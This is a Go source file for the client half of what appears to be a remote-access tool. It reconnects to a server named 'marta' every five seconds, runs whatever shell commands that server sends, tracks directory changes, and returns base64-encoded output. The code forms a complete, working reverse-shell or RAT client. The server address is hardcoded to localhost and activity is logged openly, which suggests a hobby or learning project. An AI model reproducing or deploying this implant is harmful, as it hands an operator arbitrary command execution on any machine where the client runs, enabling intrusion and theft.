// client

package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
)

const marta string = "127.0.0.1"
const port int = 2222
const delimiter string = "#+2%&"

var server *Server
var logger *log.Logger

func main() {

	f := initLogger()
	defer f.Close()

	server = NewServer(marta, port)

	loginToServer()

	err := listenToServer(handleData)

	if err != nil {
		panic(err)
	}
}

// Initializes the logger. Returns the filedecriptor so the main function can close it when it finishes.
// Kolin also writes to stdout.
func initLogger() *os.File {

	f, err := os.OpenFile("kolin.log", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		log.Fatalf("error opening file: %v", err)
	}

	wrt := io.MultiWriter(os.Stdout, f)

	logger = log.New(wrt, "", log.Ldate|log.Ltime)

	return f
}

// Tries to log into server. Will try to reconnect every 5 seconds.
func loginToServer() net.Conn {
	for {

		logger.Println("Trying to log into marta.")

		conn, err := server.Login()

		if err != nil {
			logger.Println("Login failed. Retrying in 5 seconds.")
			time.Sleep(5 * time.Second)
			continue
		}

		logger.Println("Successfully logged into marta.")

		return conn
	}
}

// Listens to data from server and passes it into the `handleData` function.
func listenToServer(handleData func(data string)) error {

	if !server.IsLoggedIn() {
		logger.Panicln("failed listening to marta: not logged into marta")
	}

	for {
		data, err := bufio.NewReader(server.Conn).ReadString('\n')

		if err != nil {
			// marta is offline
			// try to reconnect
			loginToServer()
			continue
		}

		go handleData(data)
	}
}

// Handles the data coming from the server.
func handleData(data string) {

	cmd, err := NewCommand(data)

	// if command is malformed, just answer with \n so the server knows that the client didnt time out
	if err != nil {
		logger.Println(err.Error())
		send("understood but not understood\n")
		return
	}

	switch cmd.CmdType {
	case "ping":
		ping(cmd)
	case "info":
		info(cmd)
	case "initshell", "closeshell", "shell":
		shellCmd(cmd)
	}
}

// Responds to "!ping" command.
func ping(cmd *Command) error {
	logger.Println("Got pinged by marta.")

	send("pong\n")

	return nil
}

// Responds to "!info" command.
func info(cmd *Command) error {
	logger.Println("Info requested by marta.")

	info := NewInfo()

	sendBytes(append(info.Json(), '\n'))

	return nil
}

// Executes the arguments of `cmd` as shell command and returns output.
func shellCmd(cmd *Command) (err error) {

	if cmd.CmdType == "initshell" {
		logger.Println("Shell initialized by marta.")
		cmd.Args = []string{"cd", "."}
	} else if cmd.CmdType == "closeshell" {
		logger.Println("Shell closed by marta.")
		return
	}

	// toSend builder will store the response
	toSend := strings.Builder{}

	// server wants to change working dir
	if cmd.Args[0] == "cd" {
		var newDir string

		if len(cmd.Args) > 1 {
			newDir = cmd.Args[1]
		} else {
			newDir, _ = os.UserHomeDir()
		}
		err = os.Chdir(newDir)

		// append error to response
		if err != nil {
			toSend.WriteString(err.Error())
		}

	} else {

		var stdout []byte

		execCmd := exec.Command(cmd.Args[0], cmd.Args[1:]...)
		stdout, err = execCmd.Output()

		// append error to response
		if err != nil {
			fmt.Println(err)
			toSend.WriteString(err.Error())
		}

		// append output to response
		toSend.Write(stdout)
	}

	wd, _ := os.Getwd()

	// append delimiter and working directory to response
	toSend.WriteString(delimiter + wd)

	// send response as base64, so the newlines dont let the server think the res is over
	sendAsBase64([]byte(toSend.String()))

	// send delimiter
	send("\n")

	return err
}

// Converts data to bytes and sends it to the server.
func sendBytes(data []byte) {
	server.Conn.Write(data)
}

// Converts data to bytes and sends it to the server.
func send(data string) {
	server.Conn.Write([]byte(data))
}

// Converts data to base64 and sends it to the server.
func sendAsBase64(data []byte) {
	dst := make([]byte, base64.StdEncoding.EncodedLen(len(data)))
	base64.StdEncoding.Encode(dst, data)

	server.Conn.Write(dst)
}
